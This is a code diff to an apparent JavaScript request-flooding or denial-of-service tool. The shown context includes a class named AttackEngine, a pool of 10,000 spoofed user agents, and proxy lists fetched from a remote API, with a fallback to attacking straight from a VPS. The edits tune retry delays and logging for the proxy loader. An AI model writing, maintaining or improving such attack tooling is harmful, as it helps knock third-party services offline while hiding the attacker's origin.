@@ -30,15 +30,17 @@ const UA_POOL = Array.from({ length: 10000 }, () =>
 async function getProxiesFromAPI(retries = 3) {
     for (let i = 0; i < retries; i++) {
         try {
-            const res = await axios.get('https://optrpms2.onrender.com/v2/', { timeout: 5000 });
+            const res = await axios.get('https://optrpms2.onrender.com/v2/', { timeout: 5000 }); // 5s timeout
             if (res.data && Array.isArray(res.data.proxies) && res.data.proxies.length > 0) {
                 console.log(`Loaded ${res.data.proxies.length} proxies from API.`);
                 return res.data.proxies;
+            } else {
+                console.warn(`API hit ${i + 1} came back empty.`);
             }
         } catch (err) {
             console.warn(`Proxy API fetch failed (try ${i + 1}): ${err.message}`);
         }
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 5000)); // 5s between each try
     }
     return null;
 }
@@ -83,7 +85,7 @@ class AttackEngine {
                 this.proxies = fileProxies;
             } else {
                 console.warn('No proxies available. Using VPS IP directly.');
-                this.proxies = []; // This lets it fallback to raw VPS mode
+                this.proxies = [];
             }
         }
     }
@@ -145,7 +147,7 @@ class AttackEngine {
                 this.stats.success++;
                 return;
             }
-        } catch (err) {
+        } catch {
             // ignored
         }
 
